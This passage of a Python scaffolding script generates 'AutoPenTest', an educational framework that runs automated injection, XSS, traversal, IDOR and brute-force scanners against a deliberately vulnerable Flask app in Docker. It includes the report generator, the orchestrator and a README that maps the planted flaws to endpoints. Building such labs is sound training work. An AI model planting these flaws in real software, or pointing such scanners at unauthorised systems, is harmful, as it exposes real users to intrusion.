            "Implement server-side ownership checks on every resource access",
            "Use indirect reference maps (random tokens) instead of sequential IDs",
            "Apply authentication middleware to all sensitive API endpoints",
        ],
    }

    findings_analysis = []
    seen_types = set()
    for f in findings:
        ftype = f["type"].split(" (")[0]
        if ftype in seen_types:
            continue
        seen_types.add(ftype)
        rem = []
        for key in REMEDIATION_DB:
            if key.lower() in ftype.lower():
                rem = REMEDIATION_DB[key]
                break
        if not rem:
            rem = ["Review and sanitise all user-supplied input for this feature"]

        findings_analysis.append({
            "type": f["type"],
            "cvss_score": 9.8 if f.get("severity") == "CRITICAL" else
                          7.5 if f.get("severity") == "HIGH" else
                          5.0 if f.get("severity") == "MEDIUM" else 3.1,
            "cvss_vector": "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "attack_scenario": f"Attacker exploits {f[\'type\']} at {f[\'endpoint\']} "
                                f"using payload: {f[\'payload\'][:80]}",
            "business_impact": "Potential data breach, system compromise, and reputational damage.",
            "remediation": rem,
        })

    return {
        "executive_summary": (
            f"The assessment identified {len(findings)} findings across {len(vuln_types)} "
            f"vulnerability categories. The overall risk is rated {risk}. "
            "Immediate remediation is required for critical and high severity issues."
        ),
        "risk_rating":     risk,
        "total_findings":  len(findings),
        "critical_count":  counts["CRITICAL"],
        "high_count":      counts["HIGH"],
        "medium_count":    counts["MEDIUM"],
        "low_count":       counts["LOW"],
        "findings_analysis": findings_analysis,
        "top_priorities": [
            "Immediately fix SQL injection and command injection vulnerabilities",
            "Sanitise all output to prevent XSS attacks",
            "Implement proper authentication controls and hashing",
        ],
        "positive_findings": [],
    }
'''

FILES["pentester/report_generator.py"] = '''\
"""Generates HTML and JSON penetration test reports."""
import json, os
from datetime import datetime
from jinja2 import Template
from config import REPORT_DIR, TARGET_URL

SEVERITY_COLOR = {
    "CRITICAL": "#c0392b",
    "HIGH":     "#e67e22",
    "MEDIUM":   "#f1c40f",
    "LOW":      "#27ae60",
}

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Penetration Test Report</title>
<style>
  body{font-family:\'Segoe UI\',Arial,sans-serif;margin:0;background:#f0f2f5;color:#2c3e50}
  header{background:#1a252f;color:#fff;padding:30px 40px}
  header h1{margin:0;font-size:2em}
  header p{margin:5px 0;opacity:.75}
  .content{max-width:1100px;margin:30px auto;padding:0 20px}
  .card{background:#fff;border-radius:8px;padding:25px;margin-bottom:25px;box-shadow:0 2px 8px rgba(0,0,0,.08)}
  .badge{display:inline-block;padding:4px 12px;border-radius:20px;font-size:.8em;font-weight:bold;color:#fff}
  .critical{background:#c0392b} .high{background:#e67e22}
  .medium{background:#f39c12;color:#fff} .low{background:#27ae60}
  .stat-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:20px;margin:20px 0}
  .stat-box{background:#1a252f;color:#fff;border-radius:8px;padding:20px;text-align:center}
  .stat-box .num{font-size:2.5em;font-weight:bold}
  .stat-box .lbl{font-size:.9em;opacity:.75}
  .finding{border-left:5px solid #ccc;padding:15px 20px;margin:15px 0;background:#fafafa;border-radius:0 6px 6px 0}
  .finding h3{margin:0 0 8px}
  .finding code{background:#ecf0f1;padding:2px 6px;border-radius:3px;font-family:monospace;font-size:.9em;word-break:break-all}
  table{width:100%;border-collapse:collapse;margin-top:10px}
  th{background:#34495e;color:#fff;padding:10px 15px;text-align:left}
  td{padding:10px 15px;border-bottom:1px solid #eee}
  tr:hover td{background:#f8f9fa}
  ul{margin:8px 0;padding-left:20px}
  li{margin:4px 0}
  .priority{background:#2980b9;color:#fff;padding:10px 15px;border-radius:6px;margin:8px 0}
  .exec-summary{background:linear-gradient(135deg,#1a252f,#2c3e50);color:#fff;padding:25px;border-radius:8px;line-height:1.7}
  footer{text-align:center;padding:20px;color:#999;font-size:.85em}
</style>
</head>
<body>
<header>
  <h1>🔐 Penetration Test Report</h1>
  <p>Target: <strong>{{ target }}</strong></p>
  <p>Date: {{ date }} &nbsp;|&nbsp; Overall Risk: <span class="badge {{ risk_class }}">{{ risk }}</span></p>
</header>
<div class="content">

  <div class="card exec-summary">
    <h2 style="margin-top:0;color:#fff">Executive Summary</h2>
    <p>{{ analysis.executive_summary }}</p>
  </div>

  <div class="stat-grid">
    <div class="stat-box" style="border-top:4px solid #c0392b">
      <div class="num">{{ analysis.critical_count }}</div>
      <div class="lbl">CRITICAL</div>
    </div>
    <div class="stat-box" style="border-top:4px solid #e67e22">
      <div class="num">{{ analysis.high_count }}</div>
      <div class="lbl">HIGH</div>
    </div>
    <div class="stat-box" style="border-top:4px solid #f39c12">
      <div class="num">{{ analysis.medium_count }}</div>
      <div class="lbl">MEDIUM</div>
    </div>
    <div class="stat-box" style="border-top:4px solid #27ae60">
      <div class="num">{{ analysis.low_count }}</div>
      <div class="lbl">LOW</div>
    </div>
  </div>

  <div class="card">
    <h2>Top Priorities</h2>
    {% for p in analysis.top_priorities %}
    <div class="priority">⚡ {{ p }}</div>
    {% endfor %}
  </div>

  <div class="card">
    <h2>Vulnerability Analysis</h2>
    {% for fa in analysis.findings_analysis %}
    <div class="finding" style="border-left-color:{{ severity_color(fa.cvss_score) }}">
      <h3>{{ fa.type }}
        <span style="font-size:.75em;float:right;background:{{ severity_color(fa.cvss_score) }};color:#fff;padding:3px 10px;border-radius:12px">
          CVSS {{ fa.cvss_score }}
        </span>
      </h3>
      <p><strong>Attack Scenario:</strong> {{ fa.attack_scenario }}</p>
      <p><strong>Business Impact:</strong> {{ fa.business_impact }}</p>
      <p><strong>Remediation:</strong></p>
      <ul>{% for r in fa.remediation %}<li>{{ r }}</li>{% endfor %}</ul>
    </div>
    {% endfor %}
  </div>

  <div class="card">
    <h2>Raw Findings ({{ findings | length }} total)</h2>
    <table>
      <tr><th>Severity</th><th>Type</th><th>Endpoint</th><th>Payload</th><th>Evidence</th></tr>
      {% for f in findings %}
      <tr>
        <td><span class="badge {{ f.severity | lower }}">{{ f.severity }}</span></td>
        <td>{{ f.type }}</td>
        <td><code>{{ f.endpoint }}</code></td>
        <td><code>{{ f.payload[:60] }}{% if f.payload|length > 60 %}…{% endif %}</code></td>
        <td>{{ f.evidence }}</td>
      </tr>
      {% endfor %}
    </table>
  </div>

</div>
<footer>Generated by AutoPenTest · {{ date }}</footer>
</body>
</html>
"""


def _severity_color(cvss: float) -> str:
    if cvss >= 9.0:   return "#c0392b"
    if cvss >= 7.0:   return "#e67e22"
    if cvss >= 4.0:   return "#f39c12"
    return "#27ae60"


def generate(findings: list, analysis: dict) -> dict:
    os.makedirs(REPORT_DIR, exist_ok=True)
    ts       = datetime.now().strftime("%Y%m%d_%H%M%S")
    risk     = analysis.get("risk_rating", "Unknown")
    risk_cls = risk.lower()

    # ── JSON report ──────────────────────────────────────────────────────
    json_path = os.path.join(REPORT_DIR, f"report_{ts}.json")
    with open(json_path, "w") as f:
        json.dump({"target": TARGET_URL, "date": ts,
                   "analysis": analysis, "findings": findings}, f, indent=2)

    # ── HTML report ──────────────────────────────────────────────────────
    tpl = Template(HTML_TEMPLATE)
    tpl.globals["severity_color"] = _severity_color
    html = tpl.render(
        target   = TARGET_URL,
        date     = datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        analysis = analysis,
        findings = findings,
        risk     = risk,
        risk_class = risk_cls,
    )
    html_path = os.path.join(REPORT_DIR, f"report_{ts}.html")
    with open(html_path, "w", encoding="utf-8") as f:
        f.write(html)

    return {"json": json_path, "html": html_path}
'''

FILES["pentester/main.py"] = '''\
"""
AutoPenTest – Automated Web Application Penetration Testing Framework
Entry point: discovers and runs all scanner modules, feeds results
to the AI analyzer, and generates HTML + JSON reports.
"""
import sys, time
from colorama import init, Fore, Style
from scanners import (SQLInjectionScanner, XSSScanner, AuthTester,
                      DirTraversalScanner, CommandInjectionScanner, IDORScanner)
from ai_analyzer      import analyze
from report_generator import generate
from config           import TARGET_URL, REPORT_DIR

init(autoreset=True)

BANNER = r"""
  ___        _        ____            _____          _
 / _ \\      | |      |  _ \\          |_   _|        | |
/ /_\\ \\_   _| |_ ___ | |_) |___ _ __  | | ___ _ __| |_
|  _  | | | | __/ _ \\|  __/ _ \\ \'_ \\ | |/ _ \\ \'__| __|
| | | | |_| | || (_) | | |  __/ | | || |  __/ |  | |_
\\_| |_/\\__,_|\\__\\___/|_|  \\___|_| |_\\_/\\___|_|   \\__|
                   Automated Web Pentest Framework
"""


def wait_for_target(retries=12, delay=5):
    import requests
    for i in range(retries):
        try:
            requests.get(TARGET_URL, timeout=5)
            return True
        except Exception:
            print(f"  Waiting for target ({i+1}/{retries})...")
            time.sleep(delay)
    return False


def main():
    print(Fore.CYAN + BANNER)
    print(Fore.YELLOW + f"Target: {TARGET_URL}")
    print(Fore.YELLOW + f"Report: {REPORT_DIR}")
    print(Style.RESET_ALL)

    # ── Wait for webapp to be ready ───────────────────────────────────────
    print(Fore.WHITE + "[*] Waiting for target to become available...")
    if not wait_for_target():
        print(Fore.RED + "[!] Target unreachable. Exiting.")
        sys.exit(1)
    print(Fore.GREEN + "[+] Target is up!\n")

    all_findings = []
    scanners = [
        ("SQL Injection",      SQLInjectionScanner),
        ("XSS",                XSSScanner),
        ("Authentication",     AuthTester),
        ("Path Traversal",     DirTraversalScanner),
        ("Command Injection",  CommandInjectionScanner),
        ("IDOR",               IDORScanner),
    ]

    for name, ScannerClass in scanners:
        print(Fore.CYAN + f"[*] Running {name} scanner...")
        scanner  = ScannerClass()
        findings = scanner.run()
        all_findings.extend(findings)
        count = len(findings)
        color = Fore.RED if count > 0 else Fore.GREEN
        print(color + f"    → {count} finding(s)\n")

    # ── Summary table ─────────────────────────────────────────────────────
    total = len(all_findings)
    print(Fore.YELLOW + f"[=] Total findings: {total}")

    # ── AI analysis ───────────────────────────────────────────────────────
    print(Fore.CYAN + "\n[*] Running AI analysis...")
    analysis = analyze(all_findings)
    risk     = analysis.get("risk_rating", "Unknown")
    color    = Fore.RED if risk in ("Critical", "High") else Fore.YELLOW
    print(color + f"    → Risk Rating: {risk}")
    print(Fore.WHITE + f"    → {analysis.get(\'executive_summary\',\'\'[:120])}")

    # ── Report generation ─────────────────────────────────────────────────
    print(Fore.CYAN + "\n[*] Generating reports...")
    paths = generate(all_findings, analysis)
    print(Fore.GREEN + f"    → JSON: {paths[\'json\']}")
    print(Fore.GREEN + f"    → HTML: {paths[\'html\']}")
    print(Fore.GREEN + "\n[✓] Assessment complete!")


if __name__ == "__main__":
    main()
'''

# ─────────────────────────────────────────────────────────────────────────────
# DOCKER COMPOSE
# ─────────────────────────────────────────────────────────────────────────────

FILES["docker-compose.yml"] = """\
version: '3.9'

services:

  # ── Target: intentionally vulnerable web application ────────────────────────
  webapp:
    build:
      context: ./webapp
      dockerfile: Dockerfile
    container_name: vulnapp
    ports:
      - "5000:5000"
    environment:
      - DB_PATH=/tmp/webapp.db
      - FLASK_ENV=development
    networks:
      - pentest-net
    healthcheck:
      test: ["CMD", "python", "-c", "import urllib.request; urllib.request.urlopen('http://localhost:5000/')"]
      interval: 10s
      timeout: 5s
      retries: 5

  # ── Attacker: automated penetration testing engine ──────────────────────────
  pentester:
    build:
      context: ./pentester
      dockerfile: Dockerfile
    container_name: autopentest
    depends_on:
      webapp:
        condition: service_healthy
    environment:
      - TARGET_URL=http://webapp:5000
      - OPENAI_API_KEY=${OPENAI_API_KEY:-}
      - OPENAI_MODEL=${OPENAI_MODEL:-gpt-4o-mini}
      - REPORT_DIR=/reports
    volumes:
      - ./reports:/reports
    networks:
      - pentest-net

networks:
  pentest-net:
    driver: bridge
"""

# ─────────────────────────────────────────────────────────────────────────────
# README
# ─────────────────────────────────────────────────────────────────────────────

FILES["README.md"] = """\
# 🔐 AutoPenTest – Automated Web Application Penetration Testing

> **⚠️ Educational Use Only** — This project contains intentional vulnerabilities.
> Never deploy the web application to a production or public-facing environment.

## Overview

| Component   | Description                                                        |
|-------------|--------------------------------------------------------------------|
| `webapp/`   | Intentionally vulnerable Flask web app (SQL injection, XSS, etc.) |
| `pentester/`| Automated scanner with 6 modules + AI-powered analysis             |
| `reports/`  | Auto-generated HTML & JSON pentest reports                         |

## Vulnerabilities Targeted

| Vulnerability        | Endpoint                | Severity  |
|----------------------|-------------------------|-----------|
| SQL Injection        | `/login`, `/search`     | HIGH      |
| Reflected XSS        | `/search`               | HIGH      |
| Stored XSS           | `/comments`             | HIGH      |
| IDOR                 | `/profile/<id>`         | HIGH      |
| Command Injection    | `/ping`                 | CRITICAL  |
| Path Traversal       | `/files`                | HIGH      |
| Broken Auth          | `/login`                | HIGH      |
| Unauthenticated API  | `/api/user/<id>`        | CRITICAL  |
| Verbose Errors       | `/login`                | MEDIUM    |
| No CSRF Tokens       | `/comments`             | MEDIUM    |

## Quick Start

### 1. Prerequisites
- [Docker](https://docs.docker.com/get-docker/) & Docker Compose
- Python 3.11+ (for local dev only)
- _(Optional)_ OpenAI API key for AI-enhanced analysis

### 2. Clone / setup
```bash
cd pentest
cp pentester/.env.example pentester/.env
# Edit pentester/.env and set OPENAI_API_KEY if desired
```

### 3. Run with Docker Compose
```bash
docker-compose up --build
```

- **Web App** available at: http://localhost:5000
- **Pentest** runs automatically once the webapp is healthy
- **Reports** saved to `./reports/` as `report_<timestamp>.html` and `.json`

### 4. View the Report
Open `reports/report_<timestamp>.html` in your browser.

## Manual Pentest Only (no Docker)
```bash
# Terminal 1 – start the webapp
cd webapp
pip install -r requirements.txt
python app.py

# Terminal 2 – run the pentester
cd pentester
pip install -r requirements.txt
cp .env.example .env   # set TARGET_URL=http://localhost:5000
python main.py
```

## AI Integration (OpenAI)

Set `OPENAI_API_KEY` in `pentester/.env` (or as an environment variable).
The analyzer uses `gpt-4o-mini` by default (change with `OPENAI_MODEL`).

Without an API key, a rule-based fallback analyzer runs automatically.

## Report Structure

```
reports/
├── report_20240101_120000.html   ← Visual HTML report (open in browser)
└── report_20240101_120000.json   ← Machine-readable JSON
```

HTML report includes:
- Executive summary with overall risk rating
- CVSS-scored vulnerability analysis
- Attack scenarios & business impact
- Prioritised remediation steps
- Full raw findings table

## Scanner Modules

| Module                   | Tests                                              |
|--------------------------|----------------------------------------------------|
| `sql_injection.py`       | SQLi payloads on login & search                    |
| `xss_scanner.py`         | Reflected & stored XSS                             |
| `auth_tester.py`         | Credential brute force, session fixation, debug    |
| `dir_traversal.py`       | Path traversal on file viewer                      |
| `command_injection.py`   | OS command injection on ping utility               |
| `idor_scanner.py`        | Profile IDOR, unauthenticated API access           |

## Project Structure

```
pentest/
├── webapp/
│   ├── app.py              # Vulnerable Flask app
│   ├── database.py         # SQLite init with seed data
│   ├── requirements.txt
│   ├── Dockerfile
│   └── templates/          # Jinja2 HTML templates
├── pentester/
│   ├── main.py             # Orchestrator
│   ├── config.py           # Config & payloads
│   ├── ai_analyzer.py      # OpenAI / rule-based analysis
│   ├── report_generator.py # HTML & JSON reports
│   ├── requirements.txt
│   ├── Dockerfile
│   └── scanners/
│       ├── sql_injection.py
│       ├── xss_scanner.py
│       ├── auth_tester.py
│       ├── dir_traversal.py
│       ├── command_injection.py
│       └── idor_scanner.py
├── reports/                # Output directory (auto-created)
├── docker-compose.yml
└── README.md
```
"""

# ─────────────────────────────────────────────────────────────────────────────
# WRITE ALL FILES
# ─────────────────────────────────────────────────────────────────────────────

def main():
    created = 0
    for rel_path, content in FILES.items():
        abs_path = os.path.join(BASE, rel_path)
        os.makedirs(os.path.dirname(abs_path), exist_ok=True)
        with open(abs_path, "w", encoding="utf-8") as f:
            f.write(content)
        print(f"  ✓  {rel_path}")
        created += 1

    # Create empty reports dir
    os.makedirs(os.path.join(BASE, "reports"), exist_ok=True)
    print(f"\n✅  Created {created} files. Project is ready!")
    print("\nNext steps:")
    print("  docker-compose up --build     ← run everything")
    print("  Open http://localhost:5000     ← browse the vulnerable app")
    print("  Open reports/report_*.html    ← view the pentest report")


if __name__ == "__main__":
    main()
